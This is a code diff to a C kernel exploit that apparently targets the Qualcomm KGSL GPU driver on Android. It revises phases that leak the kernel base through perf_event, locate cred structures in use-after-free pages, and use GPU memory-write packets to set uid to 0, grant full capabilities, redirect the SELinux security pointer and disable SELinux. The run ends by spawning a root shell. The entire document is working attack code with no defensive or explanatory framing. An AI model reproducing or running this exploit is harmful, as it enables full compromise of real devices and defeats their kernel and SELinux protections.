@@ -29,7 +29,6 @@ static void die(const char *msg) { perror(msg); exit(1); }
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
-
 #if defined(__aarch64__)
 static inline uint64_t read_virtual_counter(void) {
     uint64_t value;
@@ -108,7 +107,7 @@ static uint64_t detect_kaslr(uint64_t *base_out) {
     pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) {
+    if (fd < 0) { 
         printf("  perf_open: errno=%d, trying fallback\n", errno);
 #if defined(__aarch64__)
         uint64_t base = detect_kaslr_timing();
@@ -465,8 +464,7 @@ int main(int argc, char **argv) {
     uint64_t cred_pages[32];
     int cred_offs[32];
     int n_cred = 0;
-    int sec_offs[32];
-    int sec_off_found = -1;
+    int sec_offset = -1;
 
     for (uint64_t va = scan_start; va < end_va && n_cred < 1; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
@@ -503,20 +501,23 @@ int main(int argc, char **argv) {
             printf("\n  [CRED] va=0x%lx off=0x%x\n", (unsigned long)va, cred_off_found);
             cred_pages[n_cred] = va;
             cred_offs[n_cred] = cred_off_found;
+            n_cred++;
 
-            int sec_off = -1;
-            uint32_t *dptr = (uint32_t *)(dst_m + cred_off_found);
-            for (int off = 0x30; off < 0x100; off += 8) {
-                uint64_t val = ((uint64_t)dptr[(off/4)+1] << 32) | dptr[off/4];
-                if ((val >> 40) == 0xFFFFFF) {
-                    sec_off = off;
-                    break;
+            if (sec_offset == -1) {
+                for (int off = 0x30; off < SCAN_DWORDS * 4 - 8; off += 8) {
+                    uint64_t val = ((uint64_t)data[off/4+1] << 32) | data[off/4];
+                    if ((val >> 40) == 0xFFFFFF) {
+                        sec_offset = off;
+                        break;
+                    }
+                }
+                if (sec_offset == -1) {
+                    sec_offset = 0x60;
+                    printf("  using fallback security offset 0x%x\n", sec_offset);
+                } else {
+                    printf("  found security pointer offset 0x%x\n", sec_offset);
                 }
             }
-            if (sec_off < 0) sec_off = 0x60;
-            sec_offs[n_cred] = sec_off;
-            if (sec_off_found < 0) sec_off_found = sec_off;
-            n_cred++;
         }
     }
     printf("\n[*] Phase 7 complete: found %d cred pages\n", n_cred);
@@ -526,18 +527,9 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    printf("[*] Phase 7b: Prepare fake security blob in UAF pages\n");
-    for (int p = 0; p < n_cred; p++) {
-        uint32_t *page32 = (uint32_t *)cred_pages[p];
-        page32[FAKE_SEC_OFFSET / 4] = 1;
-    }
-
-    printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full) and security pointer\n");
+    printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full, security=kernel SID)\n");
     for (int p = 0; p < n_cred && p < 32; p++) {
         uint64_t cbase = cred_pages[p] + cred_offs[p];
-        int sec_off = sec_offs[p];
-        if (sec_off < 0) sec_off = 0x60;
-
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
         memset(ib_m, 0, 0x10000);
@@ -561,14 +553,16 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
         }
 
-        uint64_t sec_addr = cbase + sec_off;
-        uint64_t fake_sec = cred_pages[p] + FAKE_SEC_OFFSET;
-        uint32_t al, ah;
-        split64(sec_addr, &al, &ah);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
-        cmd[dw++] = al; cmd[dw++] = ah;
-        split64(fake_sec, &al, &ah);
-        cmd[dw++] = al; cmd[dw++] = ah;
+        if (sec_offset >= 0) {
+            uint64_t sec_addr_base = cbase + sec_offset;
+            uint64_t fake_sec_addr = cred_pages[p] + 0xFB0;
+            uint32_t al, ah;
+            split64(sec_addr_base, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
+            cmd[dw++] = al; cmd[dw++] = ah;
+            split64(fake_sec_addr, &al, &ah);
+            cmd[dw++] = al; cmd[dw++] = ah;
+        }
 
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
@@ -576,14 +570,21 @@ int main(int argc, char **argv) {
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
     }
-    flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-    printf("[+] Cred overwrite done (including security pointer)\n");
 
-    printf("[*] Phase 9: Aggressive SELinux disabling (fallback)\n");
+    for (int p = 0; p < n_cred; p++) {
+        uint32_t *page = (uint32_t *)cred_pages[p];
+        page[0xFB0 / 4] = 1;
+    }
+
+    flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+    printf("[+] Cred overwrite and security pointer redirection done\n");
+
+    printf("[*] Phase 9: Aggressive SELinux disabling\n");
+
     memset(ib_m, 0, 0x10000);
     memset(dst_m, 0, 0x1000);
-    uint32_t *cmd = (uint32_t *)ib_m;
-    int dw = 0;
+    cmd = (uint32_t *)ib_m;
+    dw = 0;
     cmd[dw++] = cp_type7(CP_NOP, 0);
     for (int i = 0; i < SELINUX_STATE_SCAN_SIZE / 4; i++) {
         uint32_t dl, dh, sl, sh;
@@ -595,7 +596,6 @@ int main(int argc, char **argv) {
     }
     cmd[dw++] = cp_type7(CP_NOP, 0);
     __sync_synchronize();
-    unsigned int ts;
     if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
         wait_timestamp(kgsl_fd, ctx_id, ts);
     __sync_synchronize();
@@ -777,7 +777,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
+        printf("\n  # ROOT SHELL (uid=0, SELinux kernel context) - type exit to quit\n  # ");
         fflush(stdout);
         waitpid(winner, NULL, 0);
         printf("[-] Root shell exited\n");
